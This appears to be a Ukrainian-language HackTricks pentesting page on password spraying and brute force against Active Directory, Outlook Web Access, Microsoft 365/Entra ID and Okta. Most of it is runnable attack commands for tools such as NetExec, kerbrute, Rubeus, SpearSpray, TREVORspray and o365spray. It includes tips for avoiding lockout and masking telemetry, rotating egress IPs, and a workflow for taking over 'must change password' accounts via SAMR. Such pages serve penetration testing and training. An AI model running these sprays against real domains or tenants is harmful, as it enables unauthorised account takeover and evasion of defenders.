# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Після того як ви знайшли кілька **valid usernames**, ви можете спробувати най **common passwords** (враховуйте password policy середовища) для кожного з виявлених користувачів.\
За **замовчуванням** **мінімальна** **довжина** **пароля** становить **7**.

Списки поширених usernames також можуть бути корисними: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Зверніть увагу, що ви **можете заблокувати деякі облікові записи, якщо спробуєте кілька неправильних паролів** (за замовчуванням більше ніж 10).

### Отримання password policy

Якщо у вас є облікові дані користувача або shell як domain user, ви можете **отримати password policy за допомогою**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Експлуатація з Linux (або будь-якої ОС)

- За допомогою **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Використання **NetExec (наступник CME)** для точкового password spraying із низьким рівнем шуму через SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Використання [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(можна вказати кількість спроб, щоб уникнути блокувань):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - НЕ РЕКОМЕНДУЄТЬСЯ, ІНОДІ НЕ ПРАЦЮЄ<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- За допомогою модуля `scanner/smb/smb_login` **Metasploit**:

![Password Spraying - Brute-Force: За допомогою модуля scanner/smb/smb login у Metasploit](<../../images/image (745).png>)

- За допомогою **rpcclient**:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Із Windows

- За допомогою [Rubeus](https://github.com/Zer1t0/Rubeus) версії з модулем brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- За допомогою [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (За замовчуванням може генерувати користувачів із домену, отримувати політику паролів із домену та обмежувати кількість спроб відповідно до неї):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- За допомогою [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Виявлення та захоплення облікових записів "Password must change at next logon" (SAMR)

Малошумна техніка полягає у spray benign/empty password і виявленні облікових записів, які повертають STATUS_PASSWORD_MUST_CHANGE; це означає, що пароль було примусово протерміновано і його можна змінити, не знаючи старого.<sup>[[9]](#references)[[10]](#references)</sup>

Workflow:
- Enumerate користувачів (RID brute через SAMR), щоб сформувати список цілей:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Виконайте password spraying із порожнім паролем і продовжуйте після успішних збігів, щоб виявити облікові записи, які мають змінити пароль під час наступного входу:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Для кожного збігу змініть пароль через SAMR за допомогою модуля NetExec (старий пароль не потрібен, коли встановлено "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Операційні примітки:
- Переконайтеся, що годинник вашого host синхронізований із DC перед операціями на основі Kerberos: `sudo ntpdate <dc_fqdn>`.
- [+] без (Pwn3d!) у деяких модулях (наприклад, RDP/WinRM) означає, що creds дійсні, але обліковий запис не має прав на інтерактивний вхід.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Password spraying на основі Kerberos pre-auth із цільовим LDAP і throttling з урахуванням PSO (SpearSpray)

Password spraying на основі Kerberos pre-auth зменшує шум порівняно зі спробами SMB/NTLM/LDAP bind і краще відповідає політикам блокування AD. SpearSpray поєднує targeting через LDAP, pattern engine та обізнаність щодо політик (domain policy + PSOs + buffer для badPwdCount), щоб виконувати spraying точно й безпечно. Також він може позначати скомпрометовані principals у Neo4j для побудови шляхів у BloodHound.<sup>[[1]](#references)</sup>

Ключові ідеї:
- Виявлення користувачів через LDAP із paging і підтримкою LDAPS, опційно з використанням custom LDAP filters.
- Фільтрація з урахуванням domain lockout policy і PSO, щоб залишати налаштовуваний buffer спроб (threshold) і не блокувати користувачів.
- Валідація Kerberos pre-auth за допомогою швидких gssapi bindings (генерує 4768/4771 на DC замість 4625).
- Створення паролів для кожного користувача на основі pattern із використанням змінних, таких як імена й часові значення, отримані з pwdLastSet кожного користувача.
- Контроль throughput за допомогою threads, jitter і максимальної кількості requests per second.
- Опційна інтеграція з Neo4j для позначення owned users у BloodHound.

Базове використання та discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Визначення цілей і керування шаблонами:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Контролі прихованості та безпеки:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Збагачення Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Огляд системи шаблонів (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Доступні змінні:
- {name}, {samaccountname}
- Часові дані з pwdLastSet кожного користувача (або whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Допоміжні елементи композиції та токен організації: {separator}, {suffix}, {extra}

Операційні примітки:

- Надавайте перевагу запитам до PDC-emulator за допомогою -dc, щоб отримувати найактуальніші badPwdCount та інформацію, пов’язану з політикою.
- Скидання badPwdCount запускається під час наступної спроби після завершення вікна спостереження; використовуйте поріг і часові інтервали, щоб залишатися в безпечних межах.
- Спроби Kerberos pre-auth відображаються як 4768/4771 у телеметрії DC; використовуйте jitter і обмеження швидкості, щоб замаскувати активність.

> Порада: стандартний розмір сторінки LDAP у SpearSpray становить 200; за потреби змініть його за допомогою -lps.

## Outlook Web Access

Існує кілька інструментів для p**assword spraying outlook**.

- За допомогою [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- За допомогою [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- За допомогою [Ruler](https://github.com/sensepost/ruler) (надійний!)<sup>[[5]](#references)</sup>
- За допомогою [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- За допомогою [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Щоб скористатися будь-яким із цих інструментів, вам потрібен список користувачів і пароль або невеликий список паролів для spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Для cloud spraying спочатку визначте, чи є tenant **managed**, **federated** або **hybrid**, оскільки endpoint і поведінка lockout можуть відрізнятися від локального AD. У Microsoft Entra **Smart Lockout** змінює спосіб, у який повторні спроби вгадування витрачають доступний ліміт блокування:<sup>[[7]](#references)</sup>

- Повторне використання **того самого неправильного пароля** не продовжує збільшувати лічильник блокування, але використання **нових кандидатів** його збільшує.
- Для **знайомих** і **незнайомих** локацій використовуються **окремі** лічильники.
- Tenants, які використовують **pass-through authentication (PTA)**, не отримують переваг від відстеження хешів неправильних паролів, тому їх слід розглядати радше як класичні lockout-sensitive targets.

На практиці використовуйте **один пароль за раунд**, залишайте достатній інтервал між раундами та надавайте перевагу tooling, який може визначити фактичний auth flow tenant перед надсиланням спроб.

- За допомогою [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray) можна виконати recon tenant, виявити `token_endpoint`, виконувати spray через `msol`/`adfs`/`owa`/`okta` і розподіляти traffic між кількома egress IP:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- За допомогою [**Spray365**](https://github.com/MarkoH17/Spray365) можна заздалегідь створити **план виконання**, який можна відновити, рандомізувати порядок auth і встановити **мінімальну затримку для кожного користувача**, щоб залишатися поза вікном блокування:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- За допомогою [**o365spray**](https://github.com/0xZDH/o365spray) можна перевірити tenant, перерахувати користувачів за допомогою таких модулів, як `onedrive`, і виконувати spray через `oauth2` або `adfs`, дотримуючись **однієї спроби на користувача** протягом вікна блокування. Якщо у вас уже є FireProx API, передайте його через `--proxy-url`, щоб розподілити вихідні IP-адреси:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Нещодавня tradecraft операторів також змістилася в бік **розподіленого cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) підтримує часові вікна, перемішування паролів, spraying через ADFS/M365 і автоматичну post-auth exfiltration. У нещодавніх реальних атаках також використовували **Microsoft Teams API** для enumeration облікових записів і **ротацію регіонів AWS**, щоб розподіляти хвилі spraying між кількома джерелами з різних географічних регіонів.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Посилання

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
